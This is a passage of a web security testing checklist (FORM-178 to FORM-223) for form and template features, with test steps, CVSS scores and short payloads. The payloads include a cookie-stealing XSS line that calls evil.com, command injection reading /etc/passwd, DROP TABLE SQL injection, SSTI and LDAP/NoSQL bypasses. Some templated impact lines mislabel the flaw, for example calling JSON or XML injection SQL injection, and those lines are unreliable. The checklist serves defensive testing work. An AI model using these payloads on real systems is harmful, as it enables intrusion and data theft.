**Test Steps:** 1. Access own template 2. Modify template_id 3. Access others' templates 4. Steal designs

**Expected Result:** Template access should verify ownership

**Payload Example:**

```
GET /api/templates/victim_template_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-179 — Template IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Modify own template 2. Change template_id 3. Modify others' templates 4. Corrupt their designs

**Expected Result:** Modification should verify ownership

**Payload Example:**

```
PUT /api/templates/victim_template_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-180 — Template IDOR Deletion
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Delete own template 2. Modify template_id 3. Delete others' templates 4. Destroy their work

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/templates/victim_template_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-181 — Template XSS via Field
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Create template with XSS in field 2. User uses template 3. XSS executes 4. User compromise

**Expected Result:** Template fields should be sanitized

**Payload Example:**

```
<script>stealSession()</script> in field label
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-182 — Template SSTI
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Create template with SSTI payload 2. Render template 3. Code executes 4. Server compromise

**Expected Result:** Templates should not process as code

**Payload Example:**

```
{{7*7}} or ${constructor.constructor('return this')()}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## FORM-183 — Template Logic Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Template has conditional logic 2. Inject malicious logic 3. Execute arbitrary conditions 4. Bypass restrictions

**Expected Result:** Logic should be safely parsed

**Payload Example:**

```
{"condition":"1==1; system('id')"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-184 — Template Clone IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Clone own template 2. Modify source_id 3. Clone others' templates 4. Steal designs

**Expected Result:** Clone should verify source ownership

**Payload Example:**

```
POST /api/templates/victim_template/clone
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-185 — Template Import Malware
**Test Category:** File Upload Vulnerabilities · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Import template from file 2. File contains malicious content 3. Server processes 4. Compromise

**Expected Result:** Imports should be validated

**Payload Example:**

```
Import PHP disguised as template
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## FORM-186 — Template Import XXE
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Import XML template 2. XML contains XXE 3. Server parses 4. File disclosure

**Expected Result:** XML import should disable entities

**Payload Example:**

```
XML template with XXE payload
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FORM-187 — Shared Template Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Template shared publicly 2. Modify shared template 3. Affect all users 4. Mass impact

**Expected Result:** Shared templates should be read-only copies

**Payload Example:**

```
Modify publicly shared template
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-188 — Template Version Manipulation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Template has versions 2. Access old version 3. Restore deprecated template 4. Bypass updates

**Expected Result:** Version access should verify permissions

**Payload Example:**

```
Restore old insecure template version
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-189 — Template Category Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Set template category 2. Inject XSS in category 3. Category displayed 4. XSS executes

**Expected Result:** Categories should be sanitized

**Payload Example:**

```
category=<script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-190 — Template Search Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Search templates 2. Inject SQL payload 3. Extract template data 4. Access all templates

**Expected Result:** Search should be parameterized

**Payload Example:**

```
search='; SELECT * FROM templates--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-191 — Template Rating Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Templates

**Test Steps:** 1. Rate template 2. Modify rating value 3. Inflate/deflate ratings 4. Manipulate popularity

**Expected Result:** Ratings should be validated

**Payload Example:**

```
{"rating":100} when max is 5
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-192 — Stored XSS in Any Form Field
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit form with XSS in any field 2. Data stored 3. Displayed elsewhere 4. XSS executes

**Expected Result:** All fields should be sanitized

**Payload Example:**

```
<script>document.location='http://evil.com?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-193 — SQL Injection in Form Submission
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit form with SQL payload 2. Data stored in database 3. Query manipulation 4. Data breach

**Expected Result:** All inputs should be parameterized

**Payload Example:**

```
'; DROP TABLE users; --
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-194 — NoSQL Injection in Form
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit form with NoSQL operators 2. Data queried 3. Bypass filters 4. Unauthorized access

**Expected Result:** NoSQL queries should be sanitized

**Payload Example:**

```
{"$gt":"",$ne:null}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## FORM-195 — Command Injection via Form
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form data used in command 2. Inject OS command 3. Command executes 4. Server compromise

**Expected Result:** User input should never reach shell

**Payload Example:**

```
; cat /etc/passwd ; or | whoami
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite / Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## FORM-196 — LDAP Injection via Form
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form data used in LDAP 2. Inject LDAP payload 3. Bypass authentication 4. Access granted

**Expected Result:** LDAP queries should be escaped

**Payload Example:**

```
*)(uid=*))(|(uid=*
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## FORM-197 — XPath Injection via Form
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form data in XPath query 2. Inject XPath payload 3. Extract XML data 4. Information disclosure

**Expected Result:** XPath should use parameterized queries

**Payload Example:**

```
' or '1'='1
```

**Impact:** XPath injection -&gt; authentication bypass / XML store disclosure.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-643; -&gt;[XPath Injection checklist](#/checklist/xpath); OWASP XPath Injection

---

## FORM-198 — Email Header Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form sends email 2. Inject headers in email field 3. Send spam 4. Reputation damage

**Expected Result:** Email fields should be sanitized

**Payload Example:**

```
email=victim@test.com%0ABcc:spam@evil.com
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite / Email Analysis

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## FORM-199 — HTTP Parameter Pollution
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit duplicate parameters 2. Check processing 3. Bypass validation 4. Unexpected behavior

**Expected Result:** Duplicate parameters should be handled

**Payload Example:**

```
field=value1&field=value2
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / HPP Testing

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## FORM-200 — Mass Assignment in Form
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit form 2. Add extra fields 3. Modify protected attributes 4. Privilege escalation

**Expected Result:** Only expected fields should be processed

**Payload Example:**

```
{"name":"test",isAdmin:true,role:"superuser"}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## FORM-201 — CSRF on Form Submission
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Create malicious page with form 2. Auto-submit form 3. User visits page 4. Form submitted without consent

**Expected Result:** Forms should have CSRF protection

**Payload Example:**

```
<form action="https://target.com/submit" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## FORM-202 — Clickjacking on Form
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Frame form page 2. Overlay transparent UI 3. Trick user to click 4. Unwanted submission

**Expected Result:** Forms should have X-Frame-Options

**Payload Example:**

```
Invisible iframe over submit button
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## FORM-203 — Form Action Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Modify form action attribute 2. Submit to different endpoint 3. Bypass security checks 4. Unauthorized action

**Expected Result:** Form action should be validated server-side

**Payload Example:**

```
Change action="/submit" to action="/admin/create"
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-204 — Hidden Field Tampering
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Find hidden fields 2. Modify values 3. Submit with tampered values 4. Bypass controls

**Expected Result:** Hidden fields should be validated server-side

**Payload Example:**

```
Modify hidden price or user_id field
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-205 — Form Token Prediction
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Analyze form tokens 2. Predict token pattern 3. Generate valid token 4. Bypass protection

**Expected Result:** Tokens should be cryptographically random

**Payload Example:**

```
Sequential or timestamp-based form tokens
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-206 — Form Replay Attack
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit valid form 2. Replay same request 3. Duplicate submission 4. Resource abuse

**Expected Result:** Forms should have replay protection

**Payload Example:**

```
Replay identical form submission
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## FORM-207 — Form Encoding Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Validation blocks certain input 2. Use different encoding 3. Bypass filter 4. Malicious input accepted

**Expected Result:** All encodings should be handled

**Payload Example:**

```
URL/HTML/Unicode encoded payload
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-208 — Form Method Override
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form uses POST 2. Override with GET 3. Bypass method restriction 4. Cached sensitive data

**Expected Result:** Method should be strictly enforced

**Payload Example:**

```
X-HTTP-Method-Override: GET or ?_method=DELETE
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / curl

**References:** CWE-840; PortSwigger Business logic

---

## FORM-209 — Form Redirect Manipulation
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form has redirect after submit 2. Modify redirect URL 3. Redirect to malicious site 4. Phishing

**Expected Result:** Redirects should be validated

**Payload Example:**

```
redirect=https://evil.com/phish
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## FORM-210 — Form Data in URL
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form uses GET method 2. Sensitive data in URL 3. URL logged/cached 4. Data exposure

**Expected Result:** Sensitive forms should use POST

**Payload Example:**

```
GET /form?password=secret&ssn=123456789
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser History

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-211 — Session Fixation via Form
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Get session ID 2. Embed in form 3. Victim submits form 4. Hijack session

**Expected Result:** Session should regenerate on submit

**Payload Example:**

```
Hidden field with fixed session ID
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## FORM-212 — Form Field Name Manipulation
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Modify field names 2. Inject malicious names 3. Backend processing error 4. Injection or error

**Expected Result:** Field names should be validated

**Payload Example:**

```
field_name=__proto__[admin] or constructor
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-213 — Prototype Pollution via Form
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Submit form with __proto__ 2. Pollute object prototype 3. Affect application logic 4. Security bypass

**Expected Result:** Prototype pollution should be prevented

**Payload Example:**

```
{"__proto__":{"isAdmin":true}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite / Postman

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## FORM-214 — JSON Injection in Form
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form submits JSON 2. Inject JSON breaking characters 3. Modify JSON structure 4. Bypass validation

**Expected Result:** JSON should be properly escaped

**Payload Example:**

```
{"name":"value",admin:"true"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-215 — XML Injection in Form
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form submits XML 2. Inject XML entities 3. Modify XML structure 4. XXE or injection

**Expected Result:** XML should be properly escaped

**Payload Example:**

```
<name>test</name><admin>true</admin>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-216 — Form Rate Limiting Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form has rate limit 2. Bypass via headers 3. Submit unlimited 4. Spam or abuse

**Expected Result:** Rate limiting should be robust

**Payload Example:**

```
X-Forwarded-For rotation on form submit
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-217 — Form Timeout Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form session has timeout 2. Keep session alive 3. Submit after intended expiry 4. Bypass timeout

**Expected Result:** Timeout should be server-enforced

**Payload Example:**

```
Submit form after session should expire
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## FORM-218 — Multi-Submit Prevention Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form prevents double submit 2. Bypass prevention 3. Submit multiple times 4. Duplicate entries

**Expected Result:** Prevention should be server-side

**Payload Example:**

```
Rapid double click or parallel submits
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## FORM-219 — Form Webhook Injection
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form has webhook feature 2. Set internal URL 3. SSRF via webhook 4. Internal access

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook=http://internal-service:8080
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FORM-220 — Form Analytics Bypass
**Test Category:** Privacy Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Form tracks submissions 2. Bypass tracking 3. Submit anonymously 4. Evade detection

**Expected Result:** Tracking should be server-side

**Payload Example:**

```
Block analytics JS while submitting
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Browser DevTools / uBlock

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## FORM-221 — Form Autofill Hijacking
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Malicious form with autofill 2. Hidden fields autofilled 3. Data submitted 4. PII stolen

**Expected Result:** Autofill should be disabled for sensitive fields

**Payload Example:**

```
Hidden fields capturing autofilled data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Manual Testing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-222 — Form Preflight Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. CORS preflight required 2. Modify request to simple 3. Bypass preflight 4. Cross-origin attack

**Expected Result:** CORS should be properly configured

**Payload Example:**

```
Convert to simple request avoiding preflight
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / curl

**References:** CWE-840; PortSwigger Business logic

---

## FORM-223 — Form Content-Type Manipulation
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Form Security

**Test Steps:** 1. Expected JSON submission 2. Submit as form-urlencoded 3. Bypass JSON validation 4. Inject payload

**Expected Result:** All content types should be handled

**Payload Example:**

```
Change Content-Type to bypass parser
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

